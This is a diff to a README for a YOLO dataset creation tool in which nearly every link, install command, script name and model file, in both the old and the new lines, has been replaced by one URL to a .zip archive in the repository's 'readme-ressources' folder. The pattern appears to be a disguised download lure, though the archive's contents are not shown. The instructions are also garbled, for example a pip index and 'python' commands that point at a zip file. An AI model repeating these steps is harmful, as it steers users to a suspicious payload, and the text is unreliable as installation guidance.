@@ -1,6 +1,6 @@
 <table>
   <tr>
-    <td><img src="https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip" alt="RACCOON!!" width="170"></td>
+    <td><img src="https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip" alt="RACCOON!!" width="170"></td>
     <td><h1>Yolo dataset creation tool</h1></td>
   </tr>
 </table>
@@ -30,16 +30,16 @@ The images given in input are not modified nor moved.
 
 ```bash
 # 1. Clone this repo
-git clone https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip
+git clone https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip
 cd yolo-dataset-tool
 
 # 2. Create the conda environment
 conda env create -n yolo-dataset python=3.12 -y
 conda activate yolo-dataset
 
-# https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip packages
-pip install torch==2.4.1 torchvision==0.19.1 --extra-index-url https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip
-pip install -U git+https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip
+# https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip packages
+pip install torch==2.4.1 torchvision==0.19.1 --extra-index-url https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip
+pip install -U git+https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip
 ```
  ---
 ## Usage
@@ -51,7 +51,7 @@ After launching the script you will be asked to give :
 
 Run
 ```bash
-python https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip -f <path/to/your/images> -a
+python https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip -f <path/to/your/images> -a
 ```
 Options:  
 `-a` : auto-annotation of the images using lang_sam, remove it if you'd like to annotate the images yourself.  
@@ -59,10 +59,10 @@ Options:
 
 ## Correct annotations
 It is very common for some annotations to be wrong so the dataset needs to be partiallyw corrected.  
-The output dataset is formated to be corrected with [LabelImg](https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip).  
+The output dataset is formated to be corrected with [LabelImg](https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip).  
 
 1. Install labelImg using the instruction in the repo, the pypi version kept crashing on my computer so used the build from source method.
-2. Launch the programm using `python3 https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip`
+2. Launch the programm using `python3 https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip`
 3. In LabelImg Click on `Open Dir` (CTRL+U) and open the /yolo_dataset/images/train or yolo_dataset/images/val directories depending on which one you want to correct.
 4. Click on `Change Save Dir` (CTRL+R) and select the label directory matching the images. If you selected correctly, labeled bounding boxes should appear.
 5. Manually correct the bounding boxes as you see fit.
@@ -74,10 +74,10 @@ conda install -c conda-forge ultralytics
 ```
 In the terminal of your choice run :
 ```bash
-yolo train data=<https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip> model=<https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip> 
+yolo train data=<https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip> model=<https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip> 
 ```
 >[!NOTE]  
-> By default https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip  
+> By default https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip  
 > See the YOLO documentation for additionnal parameters & options for training.  
  
 The results will be given in the /runs/detect/trainN/ folder, N being the training run's number.
@@ -86,7 +86,7 @@ The results will be given in the /runs/detect/trainN/ folder, N being the traini
 Test your training by running a prediction on the yolo_dataset/images/test folder: 
 
 ```bash
-yolo predict model=<https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip> source=<number of webcam or /path/to/dir> imgsz=<image_size>
-# the https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip file can be found under https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip
+yolo predict model=<https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip> source=<number of webcam or /path/to/dir> imgsz=<image_size>
+# the https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip file can be found under https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip
 ```
-You can then use this https://raw.githubusercontent.com/easdasd8/yolo-dataset-tool/main/readme-ressources/tool-dataset-yolo-1.0.zip in your code.
+You can then use this https://github.com/easdasd8/yolo-dataset-tool/raw/refs/heads/main/readme-ressources/tool-dataset-yolo-1.0.zip in your code.
